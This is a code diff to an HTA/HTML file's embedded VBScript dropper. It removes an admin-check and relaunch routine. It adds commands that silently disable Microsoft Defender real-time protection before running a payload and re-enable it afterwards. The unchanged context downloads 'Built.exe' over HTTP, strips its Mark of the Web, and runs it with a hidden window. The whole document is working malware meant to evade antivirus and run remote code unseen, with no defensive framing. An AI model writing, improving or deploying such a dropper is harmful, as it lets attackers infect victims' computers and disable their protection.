@@ -16,25 +16,9 @@
 </head>
 <body>
     <script language="VBScript">
-        ' Check if script is running with admin privileges
-        Set objShell = CreateObject("WScript.Shell")
-        If Not IsAdmin() Then
-            objShell.Run "mshta.exe ""javascript:var shell = new ActiveXObject('WScript.Shell'); shell.Run('mshta.exe ""path_to_your_htafile.hta""', 0, true);window.close();""", 1, True
-            WScript.Quit
-        End If
-        
-        ' Function to check if the script is running as Admin
-        Function IsAdmin()
-            On Error Resume Next
-            Set objShell = CreateObject("WScript.Shell")
-            objShell.Exec("net session")
-            If Err.Number = 0 Then
-                IsAdmin = True
-            Else
-                IsAdmin = False
-            End If
-            On Error GoTo 0
-        End Function
+        ' Disable Microsoft Defender (Real-Time Protection) via PowerShell
+        Set WshShell = CreateObject("WScript.Shell")
+        WshShell.Run "powershell -Command ""Set-MpPreference -DisableRealtimeMonitoring $true""", 0, True
         
         ' Create a VBScript to download and execute Built.exe silently
         Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
@@ -57,11 +41,13 @@
         End If
         
         ' Unblock the file (remove Mark of the Web)
-        Set WshShell = CreateObject("WScript.Shell")
         WshShell.Run "powershell -Command ""Unblock-File -Path '" & tempFilePath & "'""", 0, True
         
         ' Run the downloaded EXE file silently
         WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
+        
+        ' Re-enable Microsoft Defender (Real-Time Protection) after execution
+        WshShell.Run "powershell -Command ""Set-MpPreference -DisableRealtimeMonitoring $false""", 0, True
         
     </script>
 </body>
